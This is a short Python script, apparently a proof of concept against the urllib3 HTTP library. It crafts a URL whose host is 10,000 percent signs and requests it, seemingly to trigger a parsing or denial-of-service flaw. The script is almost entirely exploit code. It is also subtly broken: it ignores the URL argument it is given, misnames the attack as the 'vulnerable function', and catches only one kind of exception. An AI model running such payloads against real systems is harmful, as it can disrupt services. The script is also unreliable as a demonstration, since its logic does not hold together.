import urllib3

def vulnerable_function(url):
    # Create a PoolManager instance
    http = urllib3.PoolManager()

    # Craft a malicious URL with a large number of percent-encoded characters
    malicious_url = "http://" + "%" * 10000 + ".example.com"

    # Make a request to the malicious URL
    try:
        response = http.request('GET', malicious_url)
    except urllib3.exceptions.MaxRetryError:
        print("Error making request")

# Call the vulnerable function
vulnerable_function("http://example.com")